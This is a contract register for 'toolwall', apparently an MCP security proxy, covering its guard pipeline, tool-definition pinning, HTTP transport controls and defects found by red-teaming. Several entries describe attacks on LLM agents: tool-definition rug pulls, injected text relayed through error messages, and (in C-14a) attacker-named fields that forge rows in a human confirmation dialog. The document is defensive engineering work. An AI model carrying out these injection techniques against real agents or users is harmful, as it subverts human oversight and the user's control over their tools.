# toolwall — Contract register

Cross-module contracts. Most were not in the original design: they were discovered by
implementation, by wiring two finished modules together, or by a red-team defect. The defect is
kept in each entry, because the defect is why the rule exists.

**Ids are stable and never reused.** The register carries 32 ids — `C-0` … `C-29`, plus the
sub-contracts `C-13a` and `C-14a`. Several ids were revised more than once as the contract was
raised, wired, corrected or re-measured; each entry below folds the full history of its id, so all
42 original contract entries are represented here.

**Status vocabulary**

| Status | Meaning |
|---|---|
| **binding** | In force. Code that violates it is wrong. |
| **resolved** | Wired, fixed or closed. Kept because the reasoning still constrains future changes. |
| **open** | A known, stated gap. Fail-safe unless the entry says otherwise. |

Security-critical entries are marked **⚠ SECURITY-CRITICAL** and are: C-1, C-3, C-9, C-14a, C-20,
and the reconnect re-verification gate recorded under C-20.

---

## Index

| Id | Rule, in one line | Status |
|---|---|---|
| **Guard contract and pipeline** |||
| [C-2](#c-2) | `{ action: "allow" }` carries no findings — informational records go to an injected `AuditSink`. | resolved |
| [C-3](#c-3) | ⚠ Guard invariants: a throw is a block, no mutation, no stdout, `-32020..-32099` is reserved. | binding |
| [C-4](#c-4) | Direction is relative to trust: `request` = toward the untrusted server, `response` = toward the trusted client. | binding |
| [C-10](#c-10) | Guard order on `tools/call` is `MetadataPinGuard → SchemaGuard → CapabilityGuard`. Identity before content. | binding |
| [C-12](#c-12) | `ResultGuard` needs six `(direction, method)` registrations, never `ANY_METHOD`, and one is on the request leg. | binding |
| [C-14](#c-14) | A `confirm` verdict is resolvable by one `BudgetedConfirmationProvider` per session; non-promptable rules are denied without prompting. | binding |
| [C-15](#c-15) | `ResolvedPolicy` has `egressFor()`, `responseFor()` and `confirmation` — additive but not optional. | binding |
| [C-19](#c-19) | Only a `tools/call` result may pop the `tools/call` correlation queue. | resolved |
| [C-21](#c-21) | The advisory ATR detector is opt-in by construction, with no boolean toggle. | binding |
| **Identity and pinning** |||
| [C-0](#c-0) | One `deriveServerId`, in `src/audit/identity.ts`. Structure is identity; secrets are not. | resolved |
| [C-1](#c-1) | ⚠ Schema enforcement MUST read the pinned definition, never the live `tools/list`. | binding |
| [C-18](#c-18) | `ToolDefinitionSource.get()` takes a pin scope, and both sides of C-1 derive it from one value. | resolved / open |
| **Transport** |||
| [C-5](#c-5) | `Client.connect()` is unusable; the `Protocol` constructor's pre-registered handlers shadow the fallback hook. | binding |
| [C-6](#c-6) | Byte-identity is bounded, and the bound (`_meta` hoisting) is documented rather than claimed away. | binding |
| [C-13](#c-13) | `GuardContext` carries a `correlationId` on both legs, distinct from the reusable `exchangeId`. | resolved |
| [C-13a](#c-13a) | `ResultGuard` keys correlation and error attribution on `correlationId`, not on a queue and not per server. | resolved |
| [C-20](#c-20) | ⚠ Replay of "read-only" methods is not observationally free against an untrusted peer; and a reconnect must not be a path around a guard. | resolved |
| [C-25](#c-25) | Streamable HTTP: the client-facing leg is live with four non-optional controls; the upstream leg is not reachable from the CLI. | binding / open |
| [C-26](#c-26) | The two HTTP eras are two implementations, and the POST-only lane cannot carry unsolicited server messages. | binding |
| **Rendering and disclosure** |||
| [C-9](#c-9) | ⚠ A block must not relay the payload it blocked. | binding |
| [C-14a](#c-14a) | ⚠ Unsanitized text must not reach a human-rendered surface. The dialog's row count and frame are toolwall's. | resolved |
| **Integration and wiring completeness** |||
| [C-17](#c-17) | A guard that is not registered raises no error — so the registration count is asserted at assembly time. | resolved |
| [C-22](#c-22) | Every module under `guards/`, `policy/` and `audit/` must be classified and the classification verified against the code. | resolved |
| [C-23](#c-23) | Inference is default-ON and every claim is paired against the same call with inference off. | resolved |
| [C-24](#c-24) | Provenance is opt-in and the default path makes zero network calls, asserted against the real global `fetch`. | resolved |
| [C-27](#c-27) | Transport modules are checked for reachability against both entry points; `guards/`, `policy/`, `audit/` against `src/index.ts` alone. | binding |
| **Coverage limits** |||
| [C-7](#c-7) | Three stated gaps: per-argument path bases, no DNS resolution, `path.resolve` cannot do symlink containment. | open |
| [C-16](#c-16) | Egress constrains what the model can direct a tool to reach — not what a compromised server opens itself. | binding |
| **Performance** |||
| [C-8](#c-8) | Baselines are re-measured, never copied forward. Strict must never be the default. | resolved |
| [C-11](#c-11) | The measured latency claim, revised three times as the workloads got honest. | resolved |
| [C-28](#c-28) | The flat 5 ms budget is retired and replaced with a measured curve, gated on the mean. | binding |
| [C-29](#c-29) | A truncated walk must be a finding, not a silent pass; and `Buffer.byteLength` is ~34% of the walk. | resolved / open |

---

## Guard contract and pipeline

### C-2
**`{ action: "allow" }` carries no findings, so audit records need a side channel.**
Status: **resolved**

The `Verdict` union deliberately attaches `findings` only to `annotate`, `confirm` and `block`. A
guard that observes something worth recording but does not want to alter traffic therefore has
nowhere to put it inside the verdict. Rather than widen the `Verdict` type across a module
boundary, runtime guards emit informational records to an injected `AuditSink` passed as
`opts.audit`.

Wired to `src/audit/log.ts`: `AuditLog.sink()` is the `AuditSink` passed to both runtime guards.
Records are hash-chained — `sha256(JCS(record without hash))` plus `previousHash` — optionally
appended to a local JSONL file at mode 0600, and never sent anywhere. Blocked and annotated proxy
events, pin-engine state changes and the spawn record go to the same log. The log is **keyless**,
so it detects modification and does not prevent forgery. Do not describe it as tamper-proof.

If `allow` ever gains `findings?`, the sink becomes redundant — revisit then.

### C-3
**⚠ SECURITY-CRITICAL — Guard invariants, enforced by the pipeline.**
Status: **binding**

- A guard that **throws is treated as a block**, never an allow.
- Guards **MUST NOT mutate** the payload they receive — return `annotate` with a new value.
- **Block codes in `-32020..-32099` are rewritten to `-32600`.** That range is reserved for the
  MCP spec (§1.9) and implementations MUST NOT invent codes inside it. Pick codes outside it.
  Current usage: `-32602` for genuinely invalid params (schema violations),
  `-32600`/`TOOLWALL_BLOCKED` for well-formed but not permitted (capability).
  `RESERVED_MCP_ERROR_CODE_MAX = -32020` in `src/types/protocol.ts`.
  The one code inside the range that toolwall does emit is `MCP_HEADER_MISMATCH = -32020`, and it
  is not invented: it is the code the spec assigns. It is emitted by
  `src/transport/headers.ts` at the HTTP layer and **never by a guard** — a guard returning
  `-32020` is still rewritten.
- A `confirm` verdict **fails closed** until a `ConfirmationProvider` is wired. Implementations
  MUST NOT write to stdout — that is the protocol channel.

### C-4
**Guard direction semantics are relative to trust, not to the sender.**
Status: **binding**

`"request"` = travelling toward the untrusted server. `"response"` = travelling toward the trusted
client. So a server→client `sampling/createMessage` is inspected on the **`"response"`** leg — it
is attacker-controlled data — and the client's answer to it is inspected on the `"request"` leg.

Getting this backwards would register the sampling guards on the leg that carries the trusted
client's reply and leave the attacker-authored request uninspected.

### C-10
**Order of guards on `tools/call` is a security decision, not a preference.**
Status: **binding**

`MetadataPinGuard` → `SchemaGuard` → `CapabilityGuard`.

Identity before content: if the definition drifted, the schema and annotations the other two would
read are attacker-controlled as of that moment. Capability last because it is the only one that
touches the filesystem. The pipeline short-circuits on the first block, so this order also makes
the finding a user sees name the most fundamental problem rather than a symptom.

Guards are registered per `(direction, method)`, never with `ANY_METHOD`, so `hasGuards()` stays
false for `prompts/*`, `resources/*`, `ping`, `sampling/*` and every unknown or future method, and
those forward by reference with no work done on them.

### C-12
**The response leg needs explicit registrations, and there are six of them.**
Status: **binding**

`ResultGuard` must be registered on six `(direction, method)` pairs — on the request leg as well as
the response leg:

```
response  tools/call · resources/read · prompts/get      (RESULT_METHODS)
response  elicitation/create · sampling/createMessage    (SERVER_REQUEST_METHODS, per C-4)
request   tools/call                                     (correlation + ATPA)
```

The **request-leg** registration is not a convenience: it is where the guard learns which tool a
result belongs to, and where the ATPA sequence check runs. Registering only the response leg
silently disables `outputSchema` enforcement — nothing to correlate against — and ATPA entirely,
with no error.

Order relative to the other `tools/call` request guards is free; `ResultGuard` reads the params,
never mutates them, and its only request-leg block is the ATPA one. It is registered **last** so a
call the pin, schema and capability guards blocked is never recorded as in flight for a result that
will never arrive.

The count is enforced at assembly time (see C-17). Proven end to end rather than asserted:
`outputSchema` violation recorded at `balanced` and blocked at `response.outputSchema = "enforce"`;
the ATPA retry blocked with the private key never leaving; MRTR `systemPrompt` + `tools[]` blocked;
credential elicitation refused on the response leg with the server receiving the error and the
client never seeing a dialog.

`hasGuards()` stays false for every other method, so the transparency guarantee is unchanged for
`resources/*` subscriptions, `completion/complete`, `roots/list`, `ping` and future methods.
`roots/list` is deliberately left unregistered: no guard has a check for it, and the outer
`("response","tools/call")` registration already records every MRTR input request including it.

### C-14
**A `confirm` verdict is resolvable, and the resolution is bounded.**
Status: **binding**

`BudgetedConfirmationProvider` (`src/guards/runtime/confirm.ts`) implements `ConfirmationProvider`.

- Constructed in `assembleToolwall()` from `policy.confirmation` and `ttyChannel()`, **once per
  session**. The budget is per provider instance; do not construct one per call.
- `ttyChannel()` returns `undefined` when there is no controlling terminal. Pass it through anyway
  — an absent channel is the fail-closed path, not an error. `ToolwallOptions.confirmationChannel`
  accepts `null` to say "non-interactive" explicitly, which the integration harness defaults to,
  because a test runner started from a terminal CAN open `/dev/tty` and a promptable verdict would
  otherwise block the suite for the full timeout.
- It **never writes to stdout** (C-3). Prompts go to `/dev/tty`; `onDecision` is the operator
  channel for stderr.
- It renders only `ruleId` / `severity` / `locus` / `remediation` — the same allowlist as
  `redactFindingForClient()` (C-9). **Two of those four are not toolwall-authored; see C-14a.**
- Rules not on `confirmation.promptableRules` are denied **without** prompting. That is the design:
  86.4% approval on substituted harmful commands means the scarce thing is attention.

Observable change from wiring it: a `confirm` verdict no longer produces
`toolwall/no-confirmation-provider`. It is resolved by the provider and denied — `not-promptable`
for any rule outside `confirmation.promptableRules`, which is the load-bearing half of the budget
design. Still a block; different finding.

### C-15
**`ResolvedPolicy` gained three members — additive, but not optional.**
Status: **binding**

`egressFor(serverId)`, `responseFor(serverId)` and `confirmation`. Any hand-rolled `ResolvedPolicy`
in a test or a caller must supply all three; `defaultPolicy(tier)` and `parsePolicy()` already do.

Nothing hand-rolls a `ResolvedPolicy` in the shipped path: `assembleToolwall()` takes it whole from
`defaultPolicy()` or `parsePolicy()`, and the integration tests build policies through
`parsePolicy()` for the same reason.

### C-19
**Only a `tools/call` result may pop the `tools/call` correlation queue.**
Status: **resolved**

*Discovered by wiring C-12, not by unit tests.* `ResultGuard.#onResult()` called `#correlate(ctx)`
unconditionally, but `#onResult` handles all three of `RESULT_METHODS`. A `resources/read` result
arriving while a `tools/call` was in flight popped the pending `tools/call` entry, so that call's
result was then uncorrelated and `outputSchema` silently not enforced against it.

Bounded and fail-safe: unreachable with sequential traffic, and under concurrency the outcome was
identical to the gap C-13 already documented. So it widened a known gap rather than opening a new
one, and did not change fail-open/fail-closed.

The fix is one line in `ResultGuard.#onResult`:

```ts
const correlated = ctx.method === "tools/call" ? this.#correlate(ctx) : undefined;
```

Three tests in `test/unit/result-guard.test.ts` cover it, and two of them **fail against the old
line** — verified by reverting it — so they capture the defect rather than describing it. The third
asserts the scoping is confined to correlation: size caps and the `__proto__` scan still run on all
three result methods, because they need no correlation to be meaningful.

Since C-13a keyed correlation on `correlationId`, this guard is no longer necessary — a
`resources/read` result cannot pop a `tools/call` entry when the key is the round trip — but
keeping it costs nothing.

### C-21
**The advisory ATR detector is opt-in by construction, and there is no boolean toggle.**
Status: **binding**

`AtrAdvisoryGuard` is **never constructed by `assembleToolwall()`**. The caller supplies a pre-built
`AtrScanner` via `ToolwallOptions.atr`, or it does not exist. The CLI exposes
`--advisory-rules <enforce|alert|hunt>`, which is the only way an operator gets it, and the banner
names it only when it is actually registered.

The measured reason (`test/unit/atr-fp.test.ts`, printed on every test run): the `enforce` lane
catches **0 of 8** published tool-poisoning payloads at **0.0% FP**; `alert` catches **5 of 8** at
**6.5% FP**. Shipping the enforcing lane on by default would block nothing that matters while being
loud about the rest — theatre. The mode is `advisory` regardless of lane: findings reach stderr and
the audit log, the verdict stays `allow`.

---

## Identity and pinning

### C-0
**There is exactly one `deriveServerId`, and structure is identity while secrets are not.**
Status: **resolved**

*Discovered by integration.* Week 1 shipped `deriveServerId` in **both** `src/transport/spawn.ts`
(`stdio:<16 hex>`; ignored environment-variable names; folded an absent `cwd` into
`process.cwd()`) and `src/audit/manifest.ts` (`srv_<32 hex>`; env NAMES contribute; absent `cwd`
stays absent). Nothing failed, because nothing had wired them together.

`MetadataPinGuard` looks pins up by `ctx.serverId`, which the **transport** derives; `PinStore`
stored them under the id its own caller derived. Assembled, a mismatch means `store.get()` returns
`undefined`, `pinIfAbsent` adopts whatever the server just said, and the rug-pull control reports
success while re-running trust-on-first-use on a server it had already approved — invisible in
exactly the wrong way.

There is now one implementation, in `src/audit/identity.ts`. `manifest.ts` re-exports it;
`spawn.ts` adapts a `SpawnSpec` onto it via `serverIdentityForSpawn()`. The surviving rule:
**structure is identity, secrets are not** — env var and query-parameter NAMES contribute, values
never do, and `cwd` contributes only when the operator specified one.
`test/integration/server-identity.test.ts` asserts transport-derived === manifest-derived across
the spec shapes.

**The id format changed for transport callers** (`stdio:…` → `srv_…`), which invalidates any pin
file written by a pre-integration build.

### C-1
**⚠ SECURITY-CRITICAL — Schema enforcement MUST read from the pin store, not from live
`tools/list`.**
Status: **binding**

If `schema-guard` validates arguments against the schema the server just sent, an attacker
**widens their own schema first and then sends arguments that are now "valid."** The rug pull
legalises the payload. Argument validation must always be against the approved contract, not the
live one.

This makes pinning a **dependency** of argument validation, not a parallel feature.

`src/index.ts` exports `PinnedToolDefinitionSource`, backed by `PinRecord.definition`, and hands it
to `SchemaGuard` — and to `CapabilityGuard` for its `format: "uri"` role derivation. A pin whose
stored definition is not a usable tool object returns `undefined` rather than a guess, which routes
into `requireKnownSchema`: recorded at `balanced`, fail-closed at `strict`. **Never a fallback to
the live listing.**

`test/integration/schema-pin-binding.test.ts` runs the attack both ways: the same guard with a
live-backed source **allows** the widened-schema call that the pinned source blocks.

### C-18
**`ToolDefinitionSource.get()` takes a pin scope, and both sides of C-1 derive it from one value.**
Status: **resolved** (per session) / **open** (per call)

Pins are keyed on `(serverId, scope, kind, subject)` and `PinStore.get()` defaulted `scope` to
`DEFAULT_PIN_SCOPE`, so `PinnedToolDefinitionSource` could only ever read the default scope.
Correct **today**, because scope keying is opt-in and nothing sets a non-default scope — but the
moment an operator enables it, every lookup returns `undefined` and every call routes into
`requireKnownSchema`. Fail-safe rather than fail-open, and still a schema layer that has quietly
stopped enforcing anything.

Closed in two halves, because the scope arrives from two places:

- **Per session — resolved.** `ToolDefinitionSource.get(serverId, toolName, scope?)` now takes a
  scope, and `assembleToolwall({ pinScope })` sets `PinnedToolDefinitionSource.defaultScope` and
  `MetadataPinGuard.resolveScope` **from the same value**, so the two sides of C-1 cannot drift. A
  stdio server is launched with one credential and keeps it for the life of the process, which is
  the realistic case.
- **Per call — open.** `GuardContext` has no authorization field. When the additive
  `authorizationScope?: string` lands, the guards forward `ctx.authorizationScope` into the third
  parameter and nothing else changes. The parameter is optional, so no existing implementation
  breaks.

---

## Transport

### C-5
**Two SDK behaviours a transparent proxy must work around.**
Status: **binding**

- **`Client.connect()` is unusable here.** It synthesizes the `InitializeResult` instead of
  relaying it, which would replace the downstream server's `instructions` with toolwall's own —
  blanking a top-ranked injection surface. Use `Protocol.prototype.connect` directly and relay
  verbatim.
- **`Protocol`'s constructor pre-registers handlers that shadow the fallback hook**
  (`notifications/cancelled`, `notifications/progress`, `ping`; `Server` adds `initialize`,
  `notifications/initialized`). Left in place, **progress notifications are dropped entirely**.
  Remove all but `notifications/cancelled`, which is kept deliberately to thread `extra.signal`
  into the outbound request.

The transparency guarantee is built on `fallbackRequestHandler` / `fallbackNotificationHandler`
(verified present at `dist/esm/shared/protocol.js:274,285`). Do not enumerate methods.

### C-6
**Byte-identity is bounded, and the bound is documented.**
Status: **binding**

The SDK's stdio codec is **not** byte-preserving — `ReadBuffer` parses with zod, which rebuilds
objects with declared keys first, on every peer's read path. Raw wire bytes ARE identical for
`initialize`, `tools/list`, `tools/call`, unknown methods and errors. The single deviation is
**`_meta` hoisting** when `_meta` is not in first key position; a dedicated test asserts the raw
bytes differ but are identical post-parse, so a client cannot observe it.

Do not claim unqualified byte-identity in docs.

### C-13
**`GuardContext` carries a correlation id on both legs, distinct from the reusable `exchangeId`.**
Status: **resolved**

*Raised as a gap by the runtime area.* `GuardContext` was `{ era, serverId, direction, method }`,
so a `tools/call` RESULT did not say which tool produced it. `ResultGuard` correlated by tracking
outbound calls per server and matching a result to the single call in flight; with more than one in
flight it declined to guess and emitted `toolwall/result.uncorrelated` (`info`) rather than
enforcing `outputSchema` against the wrong tool. Fail-safe, and a real gap under concurrency —
which is the normal shape of an agent driving several tools at once.

Wiring the response leg confirmed the gap without changing it: `ToolwallProxy.#liftInputRequests`
routes MRTR by embedded method, so the era needs no branch in any guard, but the missing per-exchange
id remained.

Closed by adding **`correlationId`** to `MessageCorrelation`, populated by `ToolwallProxy` on every
context it builds. Two ids, because there are two questions:

| Question | Field | Reused? |
|---|---|---|
| "Which REQUEST does this RESULT answer?" | **`correlationId`** | never |
| "Which logical exchange is this, retries included?" | `exchangeId` | yes, by an MRTR retry — that is its purpose |

`exchangeId` was never a pairing key: an `input_required` retry deliberately reuses it, so two live
messages can share one. `correlationId` is minted per request/response round trip from a separate
counter with a different prefix (`c1`, `c2`… vs `x1`, `x2`…) so the two id spaces cannot be confused
in a log or a debugger.

Populated on: both legs of a client→server request; both legs of a server→client request; every
relayed notification; every payload lifted out of `inputRequests` (which carries the *enclosing*
round trip's id — an embedded request has no round trip of its own, and `inputRequestKey`
distinguishes siblings); and the synthetic post-reconnect re-verification. `#context()` takes
correlation as a **required** parameter, so a new leg cannot omit it by accident.

The field is optional in the *type* only, so the one out-of-transport caller that hand-rolls a
`MessageCorrelation` (`provenanceObserver`) and every unit test that builds a `GuardContext`
literal keep compiling. Read it with `correlationIdOf(ctx)`, or narrow with `isCorrelated(ctx)` to
`CorrelatedGuardContext`.

Proven, not asserted: `test/integration/correlation.test.ts` runs a real proxy against
`test/fixtures/concurrent-server.mjs`, which answers **out of order**. Five `tools/call`s with
descending delays are all in flight at once and come back reversed; every result is matched to the
call whose tag it carries.

### C-13a
**`ResultGuard` keys correlation and error attribution on `correlationId`, not on a queue and not
per server.**
Status: **resolved**

Two changes in `src/guards/runtime/result-guard.ts` that follow from C-13:

1. **The queue is replaced by a map keyed on `correlationId`.** Record on the request leg, look up
   and delete on the response leg. No ordering assumption, no ambiguity, and
   `toolwall/result.uncorrelated` stops firing under concurrency — measured before the fix as
   **4 of 5** concurrent results uncorrelated, i.e. four results whose `outputSchema` was silently
   not enforced. The map is bounded and evicts oldest-first: a request whose upstream call throws
   never reaches the response leg, so entries can accumulate.
2. **`#lastError` is keyed by TOOL, not one slot per server.** This is not a correlation fix; it is
   what correlation makes *sound*. Previously an interposed unrelated call consumed the record
   before the ATPA retry was inspected, and an error result arriving with another call in flight was
   recorded against `toolName: ""` and matched nothing afterwards. Correlation fixes the second;
   keying by tool fixes the first.

`test/integration/correlation.test.ts` contains the reference implementation (`CorrelatingProbe`)
that catches `flaky:debug_context` through an ATPA sequence with a `plain` call and a `tools/list`
interleaved between the error and the retry, alongside `QueueProbe` — the old algorithm reproduced
exactly — which catches nothing on the same traffic.

### C-20
**⚠ SECURITY-CRITICAL — Replay of "read-only" methods is not observationally free, and a reconnect
must not be a path around a guard.**
Status: **resolved**

*Two findings on the same file, one from red team round 2.*

**The replay claim.** `src/transport/reconnect.ts` described the replayed methods as having
re-execution that is "observationally free". **False against an untrusted peer.** `prompts/get`,
`resources/read` and `completion/complete` are read-only *by contract*, and the contract is the
untrusted party's. A hostile server can charge, count or advance a state machine inside any of them.

The default `replayInFlight: "read-only-methods"` **stands**, on a comparison rather than a claim of
safety: the blast radius is confined to what a server does to its own state (`tools/call` — the
method that reaches the user's money, disk and accounts — is excluded at every setting); a server
that wants re-execution does not need this path; and the alternative default makes every upstream
blip a user-visible failure, which is how a security proxy gets uninstalled. What is accepted is
**at-most-twice execution of server-side-only effects**, in exchange for session continuity.
`--replay-in-flight none` is documented for operators who do not accept it. The file header, the
`READ_ONLY_METHODS` doc comment and the CLI help all say this.

**The reconnect gate.** A reconnect is a **new server process**. The pin store is keyed on
`serverId`, which is derived from the *launch spec* and is therefore **identical across a restart —
by design**, so a routine restart does not orphan every pin. The consequence is that
`MetadataPinGuard`'s in-memory "what this connection is currently advertising" cache would survive
the restart too, and a `tools/call` released after the reconnect would be checked against a
catalogue the **previous** process advertised. An attacker who can make the server exit — and a
crash-looping server is something an attacker can often arrange — would get a definition swap for
free.

`ToolwallProxy.#reverifyAfterReconnect()` closes it. Before a single buffered request is released it
(1) drives a synthetic `notifications/tools/list_changed` through the pipeline so the cached
catalogue is marked stale, (2) replays the captured handshake so the new process's `instructions`
are re-checked, and (3) issues its own `tools/list` and runs the result through the same
`("response", "tools/list")` guards a client-originated listing would hit. **A block there fails the
buffer closed; it is not retried and it is not downgraded** (`reason: 'reverification-failed'`).
Defaults: `reverifyOnReconnect: true`, `reverifyTimeoutMs: 10_000`.

### C-25
**Streamable HTTP: the client-facing leg is live with four non-optional controls; the upstream leg
is not reachable from the CLI.**
Status: **binding** (client leg) / **open** (upstream leg)

**Live: the client-facing leg.** `src/transport/listener.ts` (`StreamableHttpListener`) implements
`Transport`, so it drops into `assembleToolwall({ clientTransport })` where `StdioServerTransport`
went. The CLI constructs it under `--listen`. **stdio remains the default and is unchanged.**

Security, none of it optional and all of it tested in `test/integration/http.test.ts`:

| Control | Behaviour | Why |
|---|---|---|
| Origin + Host validation | **403** | CVE-2025-66414 shipped DNS-rebinding protection OFF by default in the TS SDK *and simultaneously in the Python, Go, Java, Rust and Ruby SDKs*. Verified in the vendored tree: `webStandardStreamableHttp.js:79` reads `?? false` |
| Loopback bind | `127.0.0.1` default, loud warning otherwise | CVE-2025-49596 (Inspector, 9.4), CVE-2026-23744 (MCPJam, 9.8, exploited from Feb 2026) |
| Bearer token | **401**, generated when not supplied, **no flag disables it** | toolwall must not become the unauthenticated local control plane the spec warns stdio proxies about |
| Header/body agreement | **400 + `-32020`**, sentinel decoded first | Akamai header confusion: policy on the header, execution on the body |

Check order is a security decision: path → Origin/Host → auth → era shape → body → header
agreement. **Origin before credentials**, so a hostile page cannot use the refusal as an auth
oracle.

`src/transport/headers.ts` is no longer classified `exported-only`. It was classified that way in
`test/integration/wiring-completeness.test.ts` precisely so "complete control, no live consumer" had
a test behind it; wiring it made that classification false and the inverse check failed until it was
corrected to `support`. **No module claims `exported-only` today.**

**Not live: the upstream leg from the CLI.** `createUpstreamHttpTransport()` is complete and proven
end to end against a real HTTP MCP server (`test/integration/http.test.ts` drives a real
`ToolwallProxy` over it, with a guard blocking on the request leg), but `assembleToolwall()` takes a
`SpawnSpec` and builds a stdio child unconditionally. The additive option that would close it:

```ts
ToolwallOptions.upstream?: { kind: "http"; url: string } | { kind: "stdio"; spec: SpawnSpec }
```

with `createUpstreamHttpTransport` supplying the transport and the `serverId` exactly as
`createUpstreamStdioTransport` does. Until it lands, `toolwall --server` cannot point at a remote
URL, and the README says so.

### C-26
**The two HTTP eras are two implementations, and the POST-only lane cannot carry unsolicited server
messages.**
Status: **binding**

`2025-11-25` delegates to the SDK's `StreamableHTTPServerTransport`: sessions, the standalone `GET`
SSE stream, `DELETE`, resumability.

`2026-07-28` does **not**, and the reason is a hard SDK property read out of the vendored tree:
`webStandardStreamableHttp.js:174` throws *"Stateless transport cannot be reused across requests"*
the second time a transport with no `sessionIdGenerator` handles anything. The SDK's stateless mode
is one transport per HTTP request, which cannot be the client leg of a long-lived proxy session. The
POST-only shape is small enough to own: one message per POST, `202` for a notification, `405` on
GET/DELETE, no sessions, no resumability.

**Stated limitation of that lane, not discovered later:** a server→client message that is not the
answer to an in-flight POST — a relayed `notifications/message`, a `notifications/progress`, a
sampling request — has no channel on a POST-only endpoint. It is reported on the operator channel
and dropped. Under `2025-11-25` those ride the `GET` stream and are delivered normally, and
`2025-11-25` is what every shipping client speaks. Carrying them under `2026-07-28` needs the POST
response to become an SSE stream keyed on `relatedRequestId`; that is the next piece of work and is
not pretended to exist.

---

## Rendering and disclosure

### C-9
**⚠ SECURITY-CRITICAL — A block must not relay the payload it blocked.**
Status: **binding**

*Found by wiring it up.* `GuardBlockedError` used to put `findings[0].message` in the JSON-RPC error
string and the whole `Finding[]` — with `message` and `evidence` — in `error.data`. On a
`tools/list` drift block, that error carries the attacker's injected text **verbatim**, and a
JSON-RPC error goes to the LLM client, which routinely surfaces error text to the model. **The alarm
delivered the payload.**

Fixed at the seam: `redactFindingForClient()` sends the client `ruleId`, `severity`, `locus` and
`remediation`, and withholds `message` and `evidence` — both of which quote the untrusted server.

The full finding still reaches `onEvent` — the CLI's stderr — and the audit log, which are operator
channels. Guard authors may therefore keep writing rich, quoting findings; **the transport decides
what is safe to relay.**

*Correction:* this contract originally described all four relayed fields as "toolwall-authored".
That was wrong for `locus` and `remediation`. See C-14a for the bypass it allowed and the
sanitization that closes it.

### C-14a
**⚠ SECURITY-CRITICAL — Unsanitized text must not reach a human-rendered surface.**
Status: **resolved**

*Proven bypass, found by red team round 2* (`test/attacks/confirm-dialog-injection.test.ts`).

C-14 and `confirm.ts`'s header both claimed the confirmation dialog is composed "exclusively from
toolwall-authored fields — `ruleId`, `severity`, `locus`, `remediation`". **That claim was false.**

A `locus` is a JSON Pointer *into an attacker-controlled payload*, so its segments are names the
untrusted side chose. Under `deriveUrlSelectors` — on at the `balanced` default — the URL role binds
to a `format: "uri"` property whose NAME the server picks, and RFC 6901 escapes only `~` and `/`. A
property name containing newlines therefore rendered as extra rows of convincing dialog chrome —
*"Routine read-only lookup — safe to approve"*, *"pre-approved by security team"* — printed directly
above the dialog's own promise that nothing above came from the server. The same string crossed to
the LLM client through `redactFindingForClient`, which withholds `message` and `evidence` and passed
`locus` through untouched.

Reachable in the shipped configuration: TOFU pins a first-sighting-malicious definition as-is, so no
rug pull is needed. At the measured **13.6%** human catch rate this is worse than a leak — a dialog
an attacker can write into recruits the rubber stamp it was designed to avoid.

Fixed at **both** sinks with one shared pair of functions on the `Finding` contract, placed in
`src/types/protocol.ts` so neither `transport/` nor `guards/` depends on the other:

- **`sanitizeLocus()`** percent-escapes everything outside `[A-Za-z0-9_-./~]`, per UTF-8 byte, and
  truncates at 200 characters. Single-line by construction, still reads as a pointer.
- **`sanitizeRenderedText()`** collapses whitespace runs, strips C0/C1 controls and box-drawing
  characters, and truncates. Applied to `ruleId` and `remediation` — `remediation` interpolates a
  tool name and a denied hostname for the good reason that a remediation which will not name the
  thing to fix is useless.

The invariant is **structural rather than lexical**, because a lexical one is not available: no
escaping stops a server naming a property `safe_to_approve`. **The row count and the frame of the
dialog are toolwall's and cannot be changed by anything a guard puts in a finding.** The dialog's
closing line now says what is actually true. `redactFindingForClient`'s doc comment, `confirm.ts`'s
header and C-9's wording are corrected accordingly.

---

## Integration and wiring completeness

### C-17
**A guard that is not registered raises no error — so the registration count is asserted at assembly
time.**
Status: **resolved**

*Item zero, second occurrence.* `assembleToolwall()` registered exactly three guards:
`MetadataPinGuard` → `SchemaGuard` → `CapabilityGuard`. `ResultGuard`, `UnicodeHygieneGuard` and
`AtrAdvisoryGuard` existed on disk, were exported from their barrels, and were covered by passing
unit tests. **None of them ran.** Every response-leg control — ATPA, MRTR `inputRequests`,
credential elicitation, `outputSchema`, result bounds, `__proto__` rejection, invisible-character
rejection — was unreachable from the request path, and nothing failed, because a guard that is never
registered raises no error.

This is exactly the failure the integrator mandate names: *a unit test proving a detector works does
not prove it is wired into the request path.*

Two structural changes so it cannot recur:

1. **`assembleToolwall()` throws at assembly time** if `ResultGuard`'s registration count is not the
   six C-12 requires. A miscount is a startup crash, not a silent no-op.
2. **`test/integration/response-guards-e2e.test.ts`** drives every response-leg control through the
   assembled proxy against real spawned child processes. A guard that is implemented but not
   registered fails these tests, as does one registered on the wrong leg.

The startup banner (`toolwall: guards=[...]`) is asserted verbatim in
`test/integration/cli.test.ts`, so the operator-facing list cannot drift from what is actually
registered.

### C-22
**Every module under `guards/`, `policy/` and `audit/` must be classified, and the classification
verified against the code.**
Status: **resolved**

*Item zero, third occurrence.* `grep inferredPolicy src/index.ts` and
`grep provenanceObserver src/index.ts` both returned nothing. `src/policy/infer.ts` (827 lines) and
`src/audit/provenance.ts` (1,621 lines) were not imported, not exported and not reachable from any
request path. Both had green unit tests. Nothing failed, because a module nobody imports raises no
error.

Same failure as C-17 (the whole response leg) and the same failure as the double `deriveServerId`
(C-0). **Three occurrences is not a lapse, it is a missing check.**

Wired:

- `assembleToolwall()` builds `policy` **after** `tools`, because inference must read the PINNED
  `inputSchema` per C-1, and wraps it: `inferredPolicy(base, tools, { roots: [baseDir] })`.
  Default-ON, `observation` left `"off"`.
- `provenanceObserver({ identity, audit: audit.sink(), provenance }).observe` is wired into
  `MetadataPinGuardOptions.onEvent`, constructed only when `ToolwallOptions.provenance` is given.
- Both modules are re-exported from `src/index.ts`; the CLI gained `--no-inference` and the five
  provenance flags, and `parseProvenanceArgs` is called on the argv slice **before** `--`, so a flag
  belonging to the upstream server's own command line cannot switch ours on.

**The structural fix, generalised — `test/integration/wiring-completeness.test.ts`.** C-17's
assembly-time throw is kept, because failing at startup is stronger than failing in a test run, but
it knows about exactly one guard. The general form is a manifest: every module under `src/guards/`,
`src/policy/` and `src/audit/` must be classified `assembled`, `opt-in`, `support` or `barrel`, and
the classification is verified against the code:

| Claim | Verified by |
|---|---|
| `assembled` | import-reachable from `src/index.ts`, a symbol of it appears inside `assembleToolwall()`, and it is on the public export surface |
| `opt-in` | all of the above, **plus** the `ToolwallOptions` field that enables it exists in `src/index.ts` — "opt-in" cannot quietly mean "unreachable" |
| `support` | import-reachable from `src/index.ts` |
| `barrel` | contains no runtime code |

